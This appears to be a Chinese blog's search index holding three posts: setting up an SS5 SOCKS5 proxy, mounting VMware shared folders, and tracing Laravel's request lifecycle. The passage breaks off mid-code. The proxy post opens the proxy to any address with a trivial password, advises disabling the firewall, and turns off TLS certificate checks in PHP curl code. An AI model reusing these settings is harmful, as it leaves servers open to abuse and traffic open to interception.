<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[搭建Socks5代理]]></title>
    <url>%2Farticles%2F%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[最近在做3D模型下载时发现本地可以运行的代码放到服务器就跑不动了，抓包发现是服务器端无法访问三方接口，所以想到使用代理访问，同时记录下整个代理搭建过程。 安装 下载： http://sourceforge.net/projects/ss5/files/12345tar zxvf ss5-3.8.9-8.tar.gzcd ss5-3.8.9-8./configure //默认是1080端口，如果想改端口的话，./configure --with-defaultport=10900makemake install 默认安装目录在：/etc/opt/ss5 若出现报错： configure: error: * Some of the headers weren’t found * 则 需要安装： 1yum -y install pam-devel 如果出现报错： SS5OpenLdap.c:29:18: fatal error: ldap.h: No such file or directory 安装 1yum -y install openldap-devel 修改配置 /etc/opt/ss5/ss5.conf内容全部删除，仅添加内容： 12auth 0.0.0.0/0 - upermit u 0.0.0.0/0 - 0.0.0.0/0 - - - - - 添加账户 /etc/opt/ss5/ss5.passwd中添加用户名与密码： 1ss5 pass 启动socks5 默认情况ss5文件没有执行权限，如果觉得使用sh来启动麻烦，那么按如下方法： 1234chmod u+x /etc/rc.d/init.d/ss5chkconfig --add ss5 //可选chkconfig ss5 on //可选service ss5 start 注意：如果你服务器开了防火墙不要忘了关掉，或者iptables里做下策略 使用通用规则: curl -x [schema]://[user]:[pass]@[host]:[post] [URI] (-v 查询执行过程) crul 版本 &gt;= 7.21.7 时使用命令: 1curl -x socks5h://localhost:10800 http://www.google.com/ crul 版本 &gt;= 7.18.0 时使用命令: 1curl --socks5-hostname localhost:10800 http://www.google.com/ 许多工具在内部使用libcurl，或者在安装程序脚本中使用curl命令。如果很难修改命令行本身，可以使用环境变量设置代理。 1env ALL_PROXY=socks5h://localhost:10800 PROGRAM [OPTION]... 如果你想覆盖系统代理设置，你可能还需要设置两个额外的变量: 1env http_proxy=socks5h://localhost:10800 HTTPS_PROXY=socks5h://localhost:10800 ALL_PROXY=socks5h://localhost:10800 PROGRAM [OPTION]... 注意: http_proxy是小写的，其他两个是大写的。 在代码中使用： 123456789101112131415161718192021222324252627function http_post($sUrl, $aData, $aHeader = null, $proxy = false)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_URL, $sUrl); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_TIMEOUT, 10); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); if ($proxy) &#123; curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); // Sockes5代理 curl_setopt($ch, CURLOPT_PROXY, HOST); // HOST：代理服务器 curl_setopt($ch, CURLOPT_PROXYPORT, PORT); // PORT: 代理端口 curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'USER:PASS'); // USER: 账号 PASS:密码 (注意账号密码之间有一个 ':' ) &#125; !is_null($aHeader) &amp;&amp; curl_setopt($ch, CURLOPT_HTTPHEADER, $aHeader); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $aData); $sResult = curl_exec($ch); if ($sError = curl_error($ch)) &#123; response(curl_errno($ch), $sError); &#125; curl_close($ch); return $sResult;&#125;]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[vmware文件夹共享]]></title>
    <url>%2Farticles%2Fvmware%E6%96%87%E4%BB%B6%E5%A4%B9%E5%85%B1%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[1.虚拟机设置 -&gt; 选项 -&gt; 共享文件夹 -&gt; 总是启用 -&gt; 选择宿主机要映射的目录 + 起个名字 接下来切换到linux 2.安装vm-tools 1&gt; yum install -y open-vm-tools open-vm-tools-desktop 安装完后执行 1&gt; vmware-hgfsclient 就会看见我们刚刚映射的目录 我们先创建一个文件夹 再映射vmware共享文件夹到这个目录下 12mkdir -p /mnt/vmvmhgfs-fuse .host:/ /mnt/vm -o allow_other 这时候我们就可以像正常linux下文件一样去操作 /mnt/vm 下的文件 改动会和window那边一致 说了废话 本来就是一份文件 我们再将 /mnt/vm 软链接到web目录即可前面路径是 源路径 后面是目标路径 1ln -s /mnt/vm/wwwroot/ /www/ 然后创建站点，解析hosts访问 一气呵成 linux重启后 会导致挂载失效，需要重新挂载 所以我们写到开机自启脚本里给执行权限 centos7 默认 /etc/rc.d/rc.local 无执行权限 1chmod +x /etc/rc.d/rc.local 打开/etc/rc.d/rc.local 在最下面加入挂载命令自动挂载vmware宿主机的共享文件夹 1vmhgfs-fuse .host:/ /mnt/vm -o allow_other]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Laravel 启动流程]]></title>
    <url>%2Farticles%2FLaravel%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1. 程序启动准备程序入口在 index.php 中 12345678910111213require __DIR__.'/../vendor/autoload.php';$app = require_once __DIR__.'/../bootstrap/app.php'; # 获取服务容器实例$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);$response = $kernel-&gt;handle( $request = Illuminate\Http\Request::capture());$response-&gt;send();$kernel-&gt;terminate($request, $response); 创建服务容器实例 服务容器的创建在 bootstrap\app.php 中进行. 123$app = new Illuminate\Foundation\Application( realpath(__DIR__.'/../')); 1.1 容器基础配置容器 Application 的构造函数: 123456789101112public function __construct($basePath = null)&#123; if ($basePath) &#123; $this-&gt;setBasePath($basePath); &#125; $this-&gt;registerBaseBindings(); $this-&gt;registerBaseServiceProviders(); $this-&gt;registerCoreContainerAliases();&#125; 构造函数 主要完成以下基本配置: 目录路径(绑定到容器中, 并提供类方法获取子目录) 123456789101112131415161718192021public function setBasePath($basePath)&#123; $this-&gt;basePath = rtrim($basePath, '\/'); $this-&gt;bindPathsInContainer(); return $this;&#125;protected function bindPathsInContainer()&#123; $this-&gt;instance('path', $this-&gt;path()); $this-&gt;instance('path.base', $this-&gt;basePath()); $this-&gt;instance('path.lang', $this-&gt;langPath()); $this-&gt;instance('path.config', $this-&gt;configPath()); $this-&gt;instance('path.public', $this-&gt;publicPath()); $this-&gt;instance('path.storage', $this-&gt;storagePath()); $this-&gt;instance('path.database', $this-&gt;databasePath()); $this-&gt;instance('path.resources', $this-&gt;resourcePath()); $this-&gt;instance('path.bootstrap', $this-&gt;bootstrapPath());&#125; 绑定容器自身 123456789101112protected function registerBaseBindings()&#123; static::setInstance($this); $this-&gt;instance('app', $this); $this-&gt;instance(Container::class, $this); $this-&gt;instance(PackageManifest::class, new PackageManifest( new Filesystem, $this-&gt;basePath(), $this-&gt;getCachedPackagesPath() ));&#125; 基础服务注册( Event, Log, Route) 12345678protected function registerBaseServiceProviders()&#123; $this-&gt;register(new EventServiceProvider($this)); $this-&gt;register(new LogServiceProvider($this)); $this-&gt;register(new RoutingServiceProvider($this));&#125; 别名注册 多个接口名 对应一个简短别名, 后续在注册服务时只需绑定到别名上即可 (而不必绑定到具体接口名) 12345678910111213141516171819202122232425262728293031323334353637383940414243public function registerCoreContainerAliases()&#123; foreach ([ 'app' =&gt; [\Illuminate\Foundation\Application::class, \Illuminate\Contracts\Container\Container::class, \Illuminate\Contracts\Foundation\Application::class, \Psr\Container\ContainerInterface::class], 'auth' =&gt; [\Illuminate\Auth\AuthManager::class, \Illuminate\Contracts\Auth\Factory::class], 'auth.driver' =&gt; [\Illuminate\Contracts\Auth\Guard::class], 'blade.compiler' =&gt; [\Illuminate\View\Compilers\BladeCompiler::class], 'cache' =&gt; [\Illuminate\Cache\CacheManager::class, \Illuminate\Contracts\Cache\Factory::class], 'cache.store' =&gt; [\Illuminate\Cache\Repository::class, \Illuminate\Contracts\Cache\Repository::class], 'config' =&gt; [\Illuminate\Config\Repository::class, \Illuminate\Contracts\Config\Repository::class], 'cookie' =&gt; [\Illuminate\Cookie\CookieJar::class, \Illuminate\Contracts\Cookie\Factory::class, \Illuminate\Contracts\Cookie\QueueingFactory::class], 'encrypter' =&gt; [\Illuminate\Encryption\Encrypter::class, \Illuminate\Contracts\Encryption\Encrypter::class], 'db' =&gt; [\Illuminate\Database\DatabaseManager::class], 'db.connection' =&gt; [\Illuminate\Database\Connection::class, \Illuminate\Database\ConnectionInterface::class], 'events' =&gt; [\Illuminate\Events\Dispatcher::class, \Illuminate\Contracts\Events\Dispatcher::class], 'files' =&gt; [\Illuminate\Filesystem\Filesystem::class], 'filesystem' =&gt; [\Illuminate\Filesystem\FilesystemManager::class, \Illuminate\Contracts\Filesystem\Factory::class], 'filesystem.disk' =&gt; [\Illuminate\Contracts\Filesystem\Filesystem::class], 'filesystem.cloud' =&gt; [\Illuminate\Contracts\Filesystem\Cloud::class], 'hash' =&gt; [\Illuminate\Contracts\Hashing\Hasher::class], 'translator' =&gt; [\Illuminate\Translation\Translator::class, \Illuminate\Contracts\Translation\Translator::class], 'log' =&gt; [\Illuminate\Log\Writer::class, \Illuminate\Contracts\Logging\Log::class, \Psr\Log\LoggerInterface::class], 'mailer' =&gt; [\Illuminate\Mail\Mailer::class, \Illuminate\Contracts\Mail\Mailer::class, \Illuminate\Contracts\Mail\MailQueue::class], 'auth.password' =&gt; [\Illuminate\Auth\Passwords\PasswordBrokerManager::class, \Illuminate\Contracts\Auth\PasswordBrokerFactory::class], 'auth.password.broker' =&gt; [\Illuminate\Auth\Passwords\PasswordBroker::class, \Illuminate\Contracts\Auth\PasswordBroker::class], 'queue' =&gt; [\Illuminate\Queue\QueueManager::class, \Illuminate\Contracts\Queue\Factory::class, \Illuminate\Contracts\Queue\Monitor::class], 'queue.connection' =&gt; [\Illuminate\Contracts\Queue\Queue::class], 'queue.failer' =&gt; [\Illuminate\Queue\Failed\FailedJobProviderInterface::class], 'redirect' =&gt; [\Illuminate\Routing\Redirector::class], 'redis' =&gt; [\Illuminate\Redis\RedisManager::class, \Illuminate\Contracts\Redis\Factory::class], 'request' =&gt; [\Illuminate\Http\Request::class, \Symfony\Component\HttpFoundation\Request::class], 'router' =&gt; [\Illuminate\Routing\Router::class, \Illuminate\Contracts\Routing\Registrar::class, \Illuminate\Contracts\Routing\BindingRegistrar::class], 'session' =&gt; [\Illuminate\Session\SessionManager::class], 'session.store' =&gt; [\Illuminate\Session\Store::class, \Illuminate\Contracts\Session\Session::class], 'url' =&gt; [\Illuminate\Routing\UrlGenerator::class, \Illuminate\Contracts\Routing\UrlGenerator::class], 'validator' =&gt; [\Illuminate\Validation\Factory::class, \Illuminate\Contracts\Validation\Factory::class], 'view' =&gt; [\Illuminate\View\Factory::class, \Illuminate\Contracts\View\Factory::class], ] as $key =&gt; $aliases) &#123; foreach ($aliases as $alias) &#123; $this-&gt;alias($key, $alias); &#125; &#125;&#125; 1.2 核心类绑定1234567891011121314$app-&gt;singleton( Illuminate\Contracts\Http\Kernel::class, App\Http\Kernel::class);$app-&gt;singleton( Illuminate\Contracts\Console\Kernel::class, App\Console\Kernel::class);$app-&gt;singleton( Illuminate\Contracts\Debug\ExceptionHandler::class, App\Exceptions\Handler::class); 绑定重要接口: Http 核心类 命令行 核心类 异常处理类 1.3 实例化Http核心类1$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class); Http 核心类的构造函数 123456789101112131415public function __construct(Application $app, Router $router)&#123; $this-&gt;app = $app; $this-&gt;router = $router; $router-&gt;middlewarePriority = $this-&gt;middlewarePriority; foreach ($this-&gt;middlewareGroups as $key =&gt; $middleware) &#123; $router-&gt;middlewareGroup($key, $middleware); &#125; foreach ($this-&gt;routeMiddleware as $key =&gt; $middleware) &#123; $router-&gt;aliasMiddleware($key, $middleware); &#125;&#125; 上述过程主要做的事是将中间件赋值给路由 中间件顺序优先级列表 中间件组 中间件别名 核心类 app/Http/Kernel.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;?phpnamespace App\Http;use Illuminate\Foundation\Http\Kernel as HttpKernel;class Kernel extends HttpKernel&#123; // 全局中间件，最先调用 protected $middleware = [ // 检测是否应用是否进入『维护模式』 // 见：https://d.laravel-china.org/docs/5.5/configuration#maintenance-mode \Illuminate\Foundation\Http\Middleware\CheckForMaintenanceMode::class, // 检测请求的数据是否过大 \Illuminate\Foundation\Http\Middleware\ValidatePostSize::class, // 对提交的请求参数进行 PHP 函数 `trim()` 处理 \App\Http\Middleware\TrimStrings::class, // 将提交请求参数中空子串转换为 null \Illuminate\Foundation\Http\Middleware\ConvertEmptyStringsToNull::class, // 修正代理服务器后的服务器参数 \App\Http\Middleware\TrustProxies::class, ]; // 定义中间件组 protected $middlewareGroups = [ // Web 中间件组，应用于 routes/web.php 路由文件 'web' =&gt; [ // Cookie 加密解密 \App\Http\Middleware\EncryptCookies::class, // 将 Cookie 添加到响应中 \Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse::class, // 开启会话 \Illuminate\Session\Middleware\StartSession::class, // 认证用户，此中间件以后 Auth 类才能生效 // 见：https://d.laravel-china.org/docs/5.5/authentication \Illuminate\Session\Middleware\AuthenticateSession::class, // 将系统的错误数据注入到视图变量 $errors 中 \Illuminate\View\Middleware\ShareErrorsFromSession::class, // 检验 CSRF ，防止跨站请求伪造的安全威胁 // 见：https://d.laravel-china.org/docs/5.5/csrf \App\Http\Middleware\VerifyCsrfToken::class, // 处理路由绑定 // 见：https://d.laravel-china.org/docs/5.5/routing#route-model-binding \Illuminate\Routing\Middleware\SubstituteBindings::class, ], // API 中间件组，应用于 routes/api.php 路由文件 'api' =&gt; [ // 使用别名来调用中间件 // 请见：https://d.laravel-china.org/docs/5.5/middleware#为路由分配中间件 'throttle:60,1', 'bindings', ], ]; // 中间件别名设置，允许你使用别名调用中间件，例如上面的 api 中间件组调用 protected $routeMiddleware = [ // 只有登录用户才能访问，我们在控制器的构造方法中大量使用 'auth' =&gt; \Illuminate\Auth\Middleware\Authenticate::class, // HTTP Basic Auth 认证 'auth.basic' =&gt; \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class, // 处理路由绑定 // 见：https://d.laravel-china.org/docs/5.5/routing#route-model-binding 'bindings' =&gt; \Illuminate\Routing\Middleware\SubstituteBindings::class, // 用户授权功能 'can' =&gt; \Illuminate\Auth\Middleware\Authorize::class, // 只有游客才能访问，在 register 和 login 请求中使用，只有未登录用户才能访问这些页面 'guest' =&gt; \App\Http\Middleware\RedirectIfAuthenticated::class, // 访问节流，类似于 『1 分钟只能请求 10 次』的需求，一般在 API 中使用 'throttle' =&gt; \Illuminate\Routing\Middleware\ThrottleRequests::class, ];&#125; 2. 请求实例化 以处理 Http 请求为例 index.php 入口文件 123$response = $kernel-&gt;handle( $request = Illuminate\Http\Request::capture()); 请求是通过 Illuminate\Http\Request::capture() 实例化的, 主要是将请求信息以对象形式表现出来 3.请求处理入口文件: 123$response = $kernel-&gt;handle( $request = Illuminate\Http\Request::capture()); $kernel-&gt;handle(...) 处理请求过程 Illuminate\Foundation\Http\Kernel 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public function handle($request)&#123; try &#123; $request-&gt;enableHttpMethodParameterOverride(); $response = $this-&gt;sendRequestThroughRouter($request); &#125; catch (Exception $e) &#123; $this-&gt;reportException($e); $response = $this-&gt;renderException($request, $e); &#125; catch (Throwable $e) &#123; $this-&gt;reportException($e = new FatalThrowableError($e)); $response = $this-&gt;renderException($request, $e); &#125; $this-&gt;app['events']-&gt;dispatch( new Events\RequestHandled($request, $response) ); return $response;&#125;protected function sendRequestThroughRouter($request)&#123; $this-&gt;app-&gt;instance('request', $request); Facade::clearResolvedInstance('request'); $this-&gt;bootstrap(); # 核心类初始化 return (new Pipeline($this-&gt;app)) -&gt;send($request) -&gt;through($this-&gt;app-&gt;shouldSkipMiddleware() ? [] : $this-&gt;middleware) -&gt;then($this-&gt;dispatchToRouter());&#125;protected function dispatchToRouter()&#123; return function ($request) &#123; $this-&gt;app-&gt;instance('request', $request); return $this-&gt;router-&gt;dispatch($request); &#125;;&#125; 实际处理请求逻辑主要在 sendRequestThroughRouter 方法中, 它主要做了: 核心类的初始化 经由中间件过滤后将请求最终交由 Router 处理 对于 Http 请求处理, 中间件包括: 12345678910111213protected $middleware = [ \Illuminate\Foundation\Http\Middleware\CheckForMaintenanceMode::class, \Illuminate\Foundation\Http\Middleware\ValidatePostSize::class, \App\Http\Middleware\TrimStrings::class, \Illuminate\Foundation\Http\Middleware\ConvertEmptyStringsToNull::class, \App\Http\Middleware\TrustProxies::class,]; 该中间件数组定义在 Http 核心类中, 同时在核心类的构造函数中传递给 Router 类 3.1 请求处理环境初始化核心类的初始化 bootstrap() 123456789101112131415161718192021protected $bootstrappers = [ \Illuminate\Foundation\Bootstrap\LoadEnvironmentVariables::class, \Illuminate\Foundation\Bootstrap\LoadConfiguration::class, \Illuminate\Foundation\Bootstrap\HandleExceptions::class, \Illuminate\Foundation\Bootstrap\RegisterFacades::class, \Illuminate\Foundation\Bootstrap\RegisterProviders::class, \Illuminate\Foundation\Bootstrap\BootProviders::class,];# 初始化public function bootstrap()&#123; if (! $this-&gt;app-&gt;hasBeenBootstrapped()) &#123; $this-&gt;app-&gt;bootstrapWith($this-&gt;bootstrappers()); &#125;&#125;protected function bootstrappers()&#123; return $this-&gt;bootstrappers;&#125; 在服务容器 Application 类中 123456789101112public function bootstrapWith(array $bootstrappers)&#123; $this-&gt;hasBeenBootstrapped = true; foreach ($bootstrappers as $bootstrapper) &#123; $this['events']-&gt;fire('bootstrapping: '.$bootstrapper, [$this]); $this-&gt;make($bootstrapper)-&gt;bootstrap($this); $this['events']-&gt;fire('bootstrapped: '.$bootstrapper, [$this]); &#125;&#125; 该步骤主要是主要是对核心类中定义的 $bootstrappers 数组元素(引导类)初始化. bootstrap 过程具体是在服务容器来中进行, 由核心类调用并传入待初始化的类 Http 核心类默认包含以下 6 个启动服务: 环境监测 \Illuminate\Foundation\Bootstrap\LoadEnvironmentVariables::class 从 .env 文件中解析环境变量到 getevn(), $_ENV, $_SERVER, 依赖 vlucas/phpdotenv 扩展包 配置加载 \Illuminate\Foundation\Bootstrap\LoadConfiguration::class 载入 config 目录下所有 php 配置文件, 并将生成的配置存储类绑定到服务容器 $app[&#39;config&#39;] 同时配置时区及 多字节格式(utf8) 异常处理 \Illuminate\Foundation\Bootstrap\HandleExceptions::class 报告所有错误 error_report(E_ALL) 提供对未捕获的异常, 错误的全局处理 set_error_handler, set_exception_handler, register_shutdown_function 外观注册 \Illuminate\Foundation\Bootstrap\RegisterFacades::class 从 app.aliases 中读取外观配置数组 12345678910111213141516171819202122232425262728293031323334353637'aliases' =&gt; [ 'App' =&gt; Illuminate\Support\Facades\App::class, 'Artisan' =&gt; Illuminate\Support\Facades\Artisan::class, 'Auth' =&gt; Illuminate\Support\Facades\Auth::class, 'Blade' =&gt; Illuminate\Support\Facades\Blade::class, 'Broadcast' =&gt; Illuminate\Support\Facades\Broadcast::class, 'Bus' =&gt; Illuminate\Support\Facades\Bus::class, 'Cache' =&gt; Illuminate\Support\Facades\Cache::class, 'Config' =&gt; Illuminate\Support\Facades\Config::class, 'Cookie' =&gt; Illuminate\Support\Facades\Cookie::class, 'Crypt' =&gt; Illuminate\Support\Facades\Crypt::class, 'DB' =&gt; Illuminate\Support\Facades\DB::class, 'Eloquent' =&gt; Illuminate\Database\Eloquent\Model::class, 'Event' =&gt; Illuminate\Support\Facades\Event::class, 'File' =&gt; Illuminate\Support\Facades\File::class, 'Gate' =&gt; Illuminate\Support\Facades\Gate::class, 'Hash' =&gt; Illuminate\Support\Facades\Hash::class, 'Lang' =&gt; Illuminate\Support\Facades\Lang::class, 'Log' =&gt; Illuminate\Support\Facades\Log::class, 'Mail' =&gt; Illuminate\Support\Facades\Mail::class, 'Notification' =&gt; Illuminate\Support\Facades\Notification::class, 'Password' =&gt; Illuminate\Support\Facades\Password::class, 'Queue' =&gt; Illuminate\Support\Facades\Queue::class, 'Redirect' =&gt; Illuminate\Support\Facades\Redirect::class, 'Redis' =&gt; Illuminate\Support\Facades\Redis::class, 'Request' =&gt; Illuminate\Support\Facades\Request::class, 'Response' =&gt; Illuminate\Support\Facades\Response::class, 'Route' =&gt; Illuminate\Support\Facades\Route::class, 'Schema' =&gt; Illuminate\Support\Facades\Schema::class, 'Session' =&gt; Illuminate\Support\Facades\Session::class, 'Storage' =&gt; Illuminate\Support\Facades\Storage::class, 'URL' =&gt; Illuminate\Support\Facades\URL::class, 'Validator' =&gt; Illuminate\Support\Facades\Validator::class, 'View' =&gt; Illuminate\Support\Facades\View::class, ], 使用 spl_autoload_register(...) 处理类加载, 配合 class_alias() 提供类的别名调用 Facade外观类基类依赖__callStatic` 调用方法( 使用服务容器实例化对应类) 服务提供者注册 \Illuminate\Foundation\Bootstrap\RegisterProviders::class 从 app.providers 中读取所有服务提供者 1234567891011121314151617181920212223242526272829303132333435363738394041'providers' =&gt; [ /* * Laravel Framework Service Providers... */ Illuminate\Auth\AuthServiceProvider::class, Illuminate\Broadcasting\BroadcastServiceProvider::class, Illuminate\Bus\BusServiceProvider::class, Illuminate\Cache\CacheServiceProvider::class, Illuminate\Foundation\Providers\ConsoleSupportServiceProvider::class, Illuminate\Cookie\CookieServiceProvider::class, Illuminate\Database\DatabaseServiceProvider::class, Illuminate\Encryption\EncryptionServiceProvider::class, Illuminate\Filesystem\FilesystemServiceProvider::class, Illuminate\Foundation\Providers\FoundationServiceProvider::class, Illuminate\Hashing\HashServiceProvider::class, Illuminate\Mail\MailServiceProvider::class, Illuminate\Notifications\NotificationServiceProvider::class, Illuminate\Pagination\PaginationServiceProvider::class, Illuminate\Pipeline\PipelineServiceProvider::class, Illuminate\Queue\QueueServiceProvider::class, Illuminate\Redis\RedisServiceProvider::class, Illuminate\Auth\Passwords\PasswordResetServiceProvider::class, Illuminate\Session\SessionServiceProvider::class, Illuminate\Translation\TranslationServiceProvider::class, Illuminate\Validation\ValidationServiceProvider::class, Illuminate\View\ViewServiceProvider::class, /* * Package Service Providers... */ /* * Application Service Providers... */ App\Providers\AppServiceProvider::class, App\Providers\AuthServiceProvider::class, // App\Providers\BroadcastServiceProvider::class, App\Providers\EventServiceProvider::class, App\Providers\RouteServiceProvider::class, # 路由表生成 ], 服务提供者经过解析后分为 3 种类型的服务提供者: - eager 类型马上调用 register 注册 - deferred 类型记录下来, 当服务容器解析对应服务时, 才注册对应的服务提供者 - when 类型记录下来, 当对应 event 触发时在注册对应服务提供者 启动提供者 \Illuminate\Foundation\Bootstrap\BootProviders::class 调用服务容器的 boot() 方法, 依次调用在服务容器中 register 的所有服务提供者的 boot() 方法 3.2 路由处理请求在内核处理请求, 将请求实例通过中间件处理后, 将请求的处理交给路由 Router 进行控制器的分发. Http Kernel 12345678protected function dispatchToRouter()&#123; return function ($request) &#123; $this-&gt;app-&gt;instance('request', $request); return $this-&gt;router-&gt;dispatch($request); &#125;;&#125; 路由表存储结构说明 Illuminate\Routing\Route 存储单条路由 Illuminate\Routing\RouteCollection 保存所有 Route 实例, 形成路由表 Illuminate\Routing\Router 类实例持有 RouteCollection 路由表实例. 即, 一个 Router 持有一个 RouteCollection, 而 RouteCollection 拥有 N 个 Route 在 Router 中对请求的处理同样经过一系列的 路由中间件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 路由处理请求的入库public function dispatchToRoute(Request $request)&#123; return $this-&gt;runRoute($request, $this-&gt;findRoute($request));&#125;# 根据请求的 url 和 method 查找对应的 routeprotected function findRoute($request)&#123; $this-&gt;current = $route = $this-&gt;routes-&gt;match($request); $this-&gt;container-&gt;instance(Route::class, $route); return $route;&#125;# 根据对应的请求和路由条目, 返回相应的 $responseprotected function runRoute(Request $request, Route $route)&#123; $request-&gt;setRouteResolver(function () use ($route) &#123; return $route; &#125;); $this-&gt;events-&gt;dispatch(new Events\RouteMatched($route, $request)); return $this-&gt;prepareResponse($request, $this-&gt;runRouteWithinStack($route, $request) );&#125;# 请求经过路由中间件过滤后, 交由 route 的 run() 方法处理protected function runRouteWithinStack(Route $route, Request $request)&#123; $shouldSkipMiddleware = $this-&gt;container-&gt;bound('middleware.disable') &amp;&amp; $this-&gt;container-&gt;make('middleware.disable') === true; $middleware = $shouldSkipMiddleware ? [] : $this-&gt;gatherRouteMiddleware($route); return (new Pipeline($this-&gt;container)) -&gt;send($request) -&gt;through($middleware) -&gt;then(function ($request) use ($route) &#123; return $this-&gt;prepareResponse( $request, $route-&gt;run() ); &#125;);&#125; route 的 run() 方法最终将请求转给 Illuminate\Routing\ControllerDispatcher::dispatch 处理 123456789101112public function dispatch(Route $route, $controller, $method)&#123; $parameters = $this-&gt;resolveClassMethodDependencies( $route-&gt;parametersWithoutNulls(), $controller, $method ); if (method_exists($controller, 'callAction')) &#123; return $controller-&gt;callAction($method, $parameters); &#125; return $controller-&gt;&#123;$method&#125;(...array_values($parameters));&#125; 剩下的事情就是 Controller控制器 的事了. 3.3 处理返回的 Response在 Router 中有一个方法, 用于对返回的 $response 进行处理 123456789101112131415161718192021222324252627282930313233public function prepareResponse($request, $response)&#123; return static::toResponse($request, $response);&#125;/*** @return \Illuminate\Http\Response|\Illuminate\Http\JsonResponse*/public static function toResponse($request, $response)&#123; if ($response instanceof Responsable) &#123; $response = $response-&gt;toResponse($request); &#125; if ($response instanceof PsrResponseInterface) &#123; $response = (new HttpFoundationFactory)-&gt;createResponse($response); &#125; elseif (! $response instanceof SymfonyResponse &amp;&amp; ($response instanceof Arrayable || $response instanceof Jsonable || $response instanceof ArrayObject || $response instanceof JsonSerializable || is_array($response))) &#123; $response = new JsonResponse($response); &#125; elseif (! $response instanceof SymfonyResponse) &#123; $response = new Response($response); &#125; if ($response-&gt;getStatusCode() === Response::HTTP_NOT_MODIFIED) &#123; $response-&gt;setNotModified(); &#125; return $response-&gt;prepare($request); # 最后的处理&#125; 上述过程中, 在返回 $response 之前进行了最后的处理 $response-&gt;prepare($request) 该过程是在 Symfony\Component\HttpFoundation\Response::prepare() 中进行 对响应的封装是通过 Illuminate\Http\Response 类完成, 该类底层是 Symfony 框架的 Response 类 即, Symfony\Component\HttpFoundation\Response 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public function prepare(Request $request)&#123; $headers = $this-&gt;headers; if ($this-&gt;isInformational() || $this-&gt;isEmpty()) &#123; $this-&gt;setContent(null); $headers-&gt;remove('Content-Type'); $headers-&gt;remove('Content-Length'); &#125; else &#123; // Content-type based on the Request if (!$headers-&gt;has('Content-Type')) &#123; $format = $request-&gt;getRequestFormat(); if (null !== $format &amp;&amp; $mimeType = $request-&gt;getMimeType($format)) &#123; $headers-&gt;set('Content-Type', $mimeType); &#125; &#125; // Fix Content-Type $charset = $this-&gt;charset ?: 'UTF-8'; if (!$headers-&gt;has('Content-Type')) &#123; $headers-&gt;set('Content-Type', 'text/html; charset='.$charset); &#125; elseif (0 === stripos($headers-&gt;get('Content-Type'), 'text/') &amp;&amp; false === stripos($headers-&gt;get('Content-Type'), 'charset')) &#123; // add the charset $headers-&gt;set('Content-Type', $headers-&gt;get('Content-Type').'; charset='.$charset); &#125; // Fix Content-Length if ($headers-&gt;has('Transfer-Encoding')) &#123; $headers-&gt;remove('Content-Length'); &#125; if ($request-&gt;isMethod('HEAD')) &#123; // cf. RFC2616 14.13 $length = $headers-&gt;get('Content-Length'); $this-&gt;setContent(null); if ($length) &#123; $headers-&gt;set('Content-Length', $length); &#125; &#125; &#125; // Fix protocol if ('HTTP/1.0' != $request-&gt;server-&gt;get('SERVER_PROTOCOL')) &#123; $this-&gt;setProtocolVersion('1.1'); &#125; // Check if we need to send extra expire info headers if ('1.0' == $this-&gt;getProtocolVersion() &amp;&amp; false !== strpos($this-&gt;headers-&gt;get('Cache-Control'), 'no-cache')) &#123; $this-&gt;headers-&gt;set('pragma', 'no-cache'); $this-&gt;headers-&gt;set('expires', -1); &#125; $this-&gt;ensureIEOverSSLCompatibility($request); return $this;&#125; 4. 响应发送和程序终止4.1 响应的发送在 index.php 入口文件的最后是将响应返回给客户端 $response-&gt;send(); 123456789101112131415161718192021222324252627282930313233343536373839404142Symfony\Component\HttpFoundation\Responsepublic function send()&#123; $this-&gt;sendHeaders(); $this-&gt;sendContent(); if (function_exists('fastcgi_finish_request')) &#123; fastcgi_finish_request(); &#125; elseif (!\in_array(PHP_SAPI, array('cli', 'phpdbg'), true)) &#123; static::closeOutputBuffers(0, true); &#125; return $this;&#125;public function sendHeaders()&#123; // headers have already been sent by the developer if (headers_sent()) &#123; return $this; &#125; // headers foreach ($this-&gt;headers-&gt;allPreserveCase() as $name =&gt; $values) &#123; foreach ($values as $value) &#123; header($name.': '.$value, false, $this-&gt;statusCode); &#125; &#125; // status header(sprintf('HTTP/%s %s %s', $this-&gt;version, $this-&gt;statusCode, $this-&gt;statusText), true, $this-&gt;statusCode); return $this;&#125;public function sendContent()&#123; echo $this-&gt;content; return $this;&#125; 4.2 请求中止在 index.php 入口文件的最后: \$kernel-&gt;terminate( \$request, \$response ); 依旧以 Http Kernel 为例: 12345678910111213141516171819202122232425262728public function terminate($request, $response)&#123; $this-&gt;terminateMiddleware($request, $response); # 中间件中止处理 $this-&gt;app-&gt;terminate(); # 服务容器的中止处理函数&#125;protected function terminateMiddleware($request, $response)&#123; $middlewares = $this-&gt;app-&gt;shouldSkipMiddleware() ? [] : array_merge( $this-&gt;gatherRouteMiddleware($request), $this-&gt;middleware ); foreach ($middlewares as $middleware) &#123; if (! 